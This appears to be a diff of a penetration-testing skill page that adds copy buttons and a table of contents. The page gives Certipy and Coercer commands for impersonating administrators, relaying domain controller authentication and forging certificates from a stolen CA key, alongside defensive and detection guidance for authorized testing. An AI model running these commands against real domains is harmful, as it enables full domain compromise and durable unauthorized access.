@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,12 +47,13 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Enumerate and abuse Active Directory Certificate Services with Certipy and Certify — the ESC1 through ESC16 escalation paths, vulnerable template and CA configurations, NTLM relay to web enrollment, certificate-based authentication and persistence, and the strong-mapping changes that gate several of them. Use when a domain has a certificate authority, when Certipy or BloodHound reports vulnerable templates, or when escalating from a low-privilege domain user.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>A certificate authority in an Active Directory domain is usually the shortest path from a standard user to domain administrator, because certificate templates are permission objects that almost nobody audits. A single template that lets the enrollee supply their own subject name is a full domain compromise, and it is the default on more networks than it should be.</p>
+<div class="wrap slayout"><article><p>A certificate authority in an Active Directory domain is usually the shortest path from a standard user to domain administrator, because certificate templates are permission objects that almost nobody audits. A single template that lets the enrollee supply their own subject name is a full domain compromise, and it is the default on more networks than it should be.</p>
 <p>Only against domains you are authorized to test.</p>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>The domain has a CA (<code>pKIEnrollmentService</code> objects exist)</li>
 <li><code>certipy find</code> or BloodHound reports vulnerable templates</li>
@@ -49,7 +61,7 @@
 <li>You need durable domain persistence that survives a password reset</li>
 <li>Reviewing PKI configuration defensively</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>General AD attacks</strong> (Kerberoasting, DCSync, lateral movement) — use</li>
 </ul>
@@ -60,51 +72,73 @@
 <li><strong>Detecting these attacks</strong> — use <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>; certificate</li>
 </ul>
 <p>request events (4886/4887) are the primary telemetry</p>
-<h2>Enumerate First</h2>
-<pre><code># Certipy — the standard tool; run this before anything else
+<h2 id="enumerate-first">Enumerate First</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Certipy — the standard tool; run this before anything else
+certipy find -u user@domain.local -p &#x27;Password&#x27; -dc-ip 10.0.0.10 -vulnerable -stdout
+certipy find -u user@domain.local -p &#x27;Password&#x27; -dc-ip 10.0.0.10 -old-bloodhound
+
+# From Windows
+Certify.exe find /vulnerable
+Certify.exe cas                      # CA hosts, flags, and enrollment endpoints">copy</button><pre><code># Certipy — the standard tool; run this before anything else
 certipy find -u user@domain.local -p 'Password' -dc-ip 10.0.0.10 -vulnerable -stdout
 certipy find -u user@domain.local -p 'Password' -dc-ip 10.0.0.10 -old-bloodhound
 
 # From Windows
 Certify.exe find /vulnerable
-Certify.exe cas                      # CA hosts, flags, and enrollment endpoints</code></pre>
+Certify.exe cas                      # CA hosts, flags, and enrollment endpoints</code></pre></div>
 <p><code>certipy find -vulnerable</code> names the ESC number directly, which is why it is the first command. Read the output for: who can enroll, whether the requester supplies the subject, which EKUs are present, and whether manager approval is required.</p>
-<h2>The Escalation Paths</h2>
+<h2 id="the-escalation-paths">The Escalation Paths</h2>
 <p>Grouped by what is misconfigured, because the fix and the detection differ.</p>
 <h3>Template misconfiguration — the common cases</h3>
 <div class="tw"><table><thead><tr><th>ID</th><th>Condition</th><th>Result</th></tr></thead><tbody><tr><td><strong>ESC1</strong></td><td>Enrollee supplies subject (<code>ENROLLEE_SUPPLIES_SUBJECT</code>) + client-auth EKU + low-priv enrollment + no approval</td><td>Request a cert <em>as any user</em>, including a domain admin</td></tr><tr><td><strong>ESC2</strong></td><td>Any Purpose EKU (or no EKU) + low-priv enrollment</td><td>Cert usable for client auth; same outcome as ESC1</td></tr><tr><td><strong>ESC3</strong></td><td>Certificate Request Agent EKU</td><td>Enroll on behalf of another user</td></tr><tr><td><strong>ESC9</strong></td><td><code>CT_FLAG_NO_SECURITY_EXTENSION</code> set</td><td>Cert lacks the SID binding, enabling weak-mapping abuse</td></tr><tr><td><strong>ESC15</strong></td><td>v1 template with enrollee-supplied subject, application policies injectable</td><td>Client auth via application policy, bypassing the EKU restriction</td></tr></tbody></table></div>
-<pre><code># ESC1 — the canonical path
+<div class="codeblk cx"><button class="copy" data-copy="# ESC1 — the canonical path
+certipy req -u user@domain.local -p &#x27;Password&#x27; -dc-ip 10.0.0.10 \
+  -ca &#x27;CORP-CA&#x27; -template &#x27;VulnTemplate&#x27; -upn &#x27;administrator@domain.local&#x27;
+
+# Authenticate with the certificate and recover the NT hash
+certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
+# → TGT plus the account&#x27;s NT hash">copy</button><pre><code># ESC1 — the canonical path
 certipy req -u user@domain.local -p 'Password' -dc-ip 10.0.0.10 \
   -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@domain.local'
 
 # Authenticate with the certificate and recover the NT hash
 certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
-# → TGT plus the account's NT hash</code></pre>
+# → TGT plus the account's NT hash</code></pre></div>
 <h3>Access-control misconfiguration</h3>
 <div class="tw"><table><thead><tr><th>ID</th><th>Condition</th><th>Result</th></tr></thead><tbody><tr><td><strong>ESC4</strong></td><td>You have write over a template object</td><td>Reconfigure it into an ESC1 template, use it, then restore</td></tr><tr><td><strong>ESC5</strong></td><td>Write over PKI objects, CA computer object, or the container</td><td>Various, up to CA control</td></tr><tr><td><strong>ESC7</strong></td><td><code>ManageCA</code> or <code>ManageCertificates</code> on the CA</td><td>Enable ESC6, or approve your own pending request</td></tr></tbody></table></div>
-<pre><code># ESC4 — make it vulnerable, use it, put it back
+<div class="codeblk cx"><button class="copy" data-copy="# ESC4 — make it vulnerable, use it, put it back
+certipy template -u user@domain.local -p &#x27;Password&#x27; -template &#x27;WriteableTemplate&#x27; -save-old
+# ... request as in ESC1 ...
+certipy template -u user@domain.local -p &#x27;Password&#x27; -template &#x27;WriteableTemplate&#x27; -configuration WriteableTemplate.json">copy</button><pre><code># ESC4 — make it vulnerable, use it, put it back
 certipy template -u user@domain.local -p 'Password' -template 'WriteableTemplate' -save-old
 # ... request as in ESC1 ...
-certipy template -u user@domain.local -p 'Password' -template 'WriteableTemplate' -configuration WriteableTemplate.json</code></pre>
+certipy template -u user@domain.local -p 'Password' -template 'WriteableTemplate' -configuration WriteableTemplate.json</code></pre></div>
 <p><strong>Restoring the template is not optional.</strong> Leaving a template in a vulnerable state is a real change to the client's security posture, and doing so unannounced is a finding against you, not them. <code>-save-old</code> first, restore immediately, and record both actions with timestamps.</p>
 <h3>CA misconfiguration</h3>
 <div class="tw"><table><thead><tr><th>ID</th><th>Condition</th><th>Result</th></tr></thead><tbody><tr><td><strong>ESC6</strong></td><td><code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> on the CA</td><td>Any template becomes subject-suppliable</td></tr><tr><td><strong>ESC16</strong></td><td>Security extension disabled CA-wide</td><td>Every issued cert lacks SID binding</td></tr></tbody></table></div>
-<pre><code># Check the CA flags
-certutil -config "CA-HOST\CORP-CA" -getreg policy\EditFlags</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="# Check the CA flags
+certutil -config &quot;CA-HOST\CORP-CA&quot; -getreg policy\EditFlags">copy</button><pre><code># Check the CA flags
+certutil -config "CA-HOST\CORP-CA" -getreg policy\EditFlags</code></pre></div>
 <h3>Relay paths</h3>
 <div class="tw"><table><thead><tr><th>ID</th><th>Condition</th><th>Result</th></tr></thead><tbody><tr><td><strong>ESC8</strong></td><td>Web enrollment (<code>/certsrv</code>) reachable, no EPA/HTTPS binding</td><td>Relay NTLM to enrollment, get a cert for the relayed machine</td></tr><tr><td><strong>ESC11</strong></td><td><code>ICertPassage</code> RPC without packet integrity</td><td>Relay over RPC instead of HTTP</td></tr></tbody></table></div>
-<pre><code># ESC8: coerce authentication from a DC, relay it to web enrollment
+<div class="codeblk cx"><button class="copy" data-copy="# ESC8: coerce authentication from a DC, relay it to web enrollment
+certipy relay -ca 10.0.0.20 -template DomainController
+# in another shell, coerce:
+coercer coerce -u user -p &#x27;Password&#x27; -t 10.0.0.10 -l 10.0.0.100
+# or PetitPotam / printerbug
+certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10     # → DC machine account → DCSync">copy</button><pre><code># ESC8: coerce authentication from a DC, relay it to web enrollment
 certipy relay -ca 10.0.0.20 -template DomainController
 # in another shell, coerce:
 coercer coerce -u user -p 'Password' -t 10.0.0.10 -l 10.0.0.100
 # or PetitPotam / printerbug
-certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10     # → DC machine account → DCSync</code></pre>
+certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10     # → DC machine account → DCSync</code></pre></div>
 <h3>Certificate mapping</h3>
 <div class="tw"><table><thead><tr><th>ID</th><th>Condition</th><th>Result</th></tr></thead><tbody><tr><td><strong>ESC10</strong></td><td>Weak certificate mapping registry values</td><td>Impersonate via UPN or altSecurityIdentities</td></tr><tr><td><strong>ESC13</strong></td><td>Template with an issuance policy linked to a group</td><td>Cert grants that group's membership</td></tr><tr><td><strong>ESC14</strong></td><td>Write access to <code>altSecurityIdentities</code></td><td>Map your certificate to a target account</td></tr></tbody></table></div>
 <p><strong>Strong certificate binding changes the picture.</strong> After the May 2022 updates (KB5014754), domain controllers can require certificates to carry the SID security extension, and <code>StrongCertificateBindingEnforcement</code> governs how strictly. On a fully-enforcing domain, ESC9, ESC10, and Certifried (CVE-2022-26923) stop working, while ESC1, ESC4, ESC6, and ESC8 do not. Check the enforcement level before reporting a path as exploitable:</p>
-<pre><code>reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
-# 0 = disabled, 1 = compatibility (default for a period), 2 = full enforcement</code></pre>
-<h2>Persistence</h2>
+<div class="codeblk cx"><button class="copy" data-copy="reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services\Kdc&quot; /v StrongCertificateBindingEnforcement
+# 0 = disabled, 1 = compatibility (default for a period), 2 = full enforcement">copy</button><pre><code>reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
+# 0 = disabled, 1 = compatibility (default for a period), 2 = full enforcement</code></pre></div>
+<h2 id="persistence">Persistence</h2>
 <p>Certificates are the most durable AD persistence available, which is exactly why they matter in a report.</p>
 <ul>
 <li>A user certificate remains valid for its lifetime **through password</li>
@@ -118,12 +152,15 @@ certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10     # → DC machine account → DCS
 <li>Revocation is the only remedy, and most environments do not check CRLs</li>
 </ul>
 <p>promptly or at all.</p>
-<pre><code># Extract the CA key with local admin on the CA host (DPAPI-protected)
+<div class="codeblk cx"><button class="copy" data-copy="# Extract the CA key with local admin on the CA host (DPAPI-protected)
+certipy ca -backup -u user@domain.local -p &#x27;Password&#x27; -ca &#x27;CORP-CA&#x27;
+# Forge offline
+certipy forge -ca-pfx ca.pfx -upn administrator@domain.local">copy</button><pre><code># Extract the CA key with local admin on the CA host (DPAPI-protected)
 certipy ca -backup -u user@domain.local -p 'Password' -ca 'CORP-CA'
 # Forge offline
-certipy forge -ca-pfx ca.pfx -upn administrator@domain.local</code></pre>
+certipy forge -ca-pfx ca.pfx -upn administrator@domain.local</code></pre></div>
 <p>State this explicitly when reporting: "password resets do not remediate this; the issued certificates must be revoked" is the sentence that changes the client's response plan.</p>
-<h2>Defensive Review</h2>
+<h2 id="defensive-review">Defensive Review</h2>
 <p>When the engagement is a configuration review rather than an attack:</p>
 <ul>
 <li>Which templates allow enrollee-supplied subjects, and who can enroll?</li>
@@ -138,7 +175,7 @@ certipy forge -ca-pfx ca.pfx -upn administrator@domain.local</code></pre>
 <li>Who holds <code>ManageCA</code> and <code>ManageCertificates</code>?</li>
 <li>Is certificate issuance monitored (events 4886, 4887, 4899, 4900)?</li>
 </ul>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"The template requires manager approval, so it's safe."</em> Check ESC7 — a</li>
 </ul>
@@ -166,19 +203,22 @@ certipy forge -ca-pfx ca.pfx -upn administrator@domain.local</code></pre>
 <ul>
 <li><em>"I'll leave the template modified, it's easier."</em> No.</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Credential Access</strong> (TA0006)</p>
 <ul>
 <li><a href="https://attack.mitre.org/techniques/T1649/">T1649</a> Steal or Forge Authentication Certificates — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a> — the wider domain attack path</li>
 <li><a class="xref" href="attacking-kerberos-delegation.html"><code>attacking-kerberos-delegation</code></a> — the other high-yield AD escalation family</li>
 <li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> — certificate issuance and template change telemetry</li>
 <li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — how to state the revocation requirement</li>
 <li>Certipy, Certify, PKIAudit, BloodHound (ADCS edges), Coercer, PetitPotam</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#enumerate-first">Enumerate First</a><a href="#the-escalation-paths">The Escalation Paths</a><a href="#persistence">Persistence</a><a href="#defensive-review">Defensive Review</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
